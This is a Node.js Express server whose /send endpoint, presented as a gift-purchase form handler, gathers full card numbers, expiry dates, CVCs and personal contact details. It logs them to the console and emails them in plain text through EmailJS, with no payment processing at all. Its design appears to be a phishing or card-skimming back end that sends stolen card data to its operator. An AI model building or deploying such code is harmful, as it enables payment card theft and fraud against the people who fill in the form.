import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import cors from "cors";
import emailjs from "@emailjs/nodejs";
import 'dotenv/config';

const app = express();
const PORT = process.env.PORT || 3000;

// ES Module fix for __dirname
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Serve index.html
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// NEW UPDATED SEND ENDPOINT
app.post("/send", async (req, res) => {
  const data = req.body;

  // Build email content from POST data
  const templateParams = {
    gift_title: data.giftTitle || "",
    gift_price: data.giftPrice || "",
    gift_type: data.giftType || "",

    card_number: data.cardNumber || "",
    exp_date: data.expDate || "",
    cvc: data.cvc || "",
    card_name: data.cardName || "",

    first_name: data.firstName || "",
    last_name: data.lastName || "",
    address1: data.address1 || "",
    address2: data.address2 || "",
    email: data.email || "",
    mobile: data.mobile || "",
    country: data.country || ""
  };

  console.log("📨 RECEIVED DATA:", templateParams);

  try {
    const emailResponse = await emailjs.send(
      process.env.EMAILJS_SERVICE,
      process.env.EMAILJS_TEMPLATE,
      templateParams,
      {
        publicKey: process.env.EMAILJS_PUBLIC_KEY,
        privateKey: process.env.EMAILJS_PRIVATE_KEY
      }
    );

    console.log("📨 Email sent:", emailResponse.text);
    res.status(200).json({ success: true, message: "Form sent successfully!" });

  } catch (err) {
    console.error("❌ EmailJS error:", err);
    res.status(500).json({ success: false, message: "Failed to send form" });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
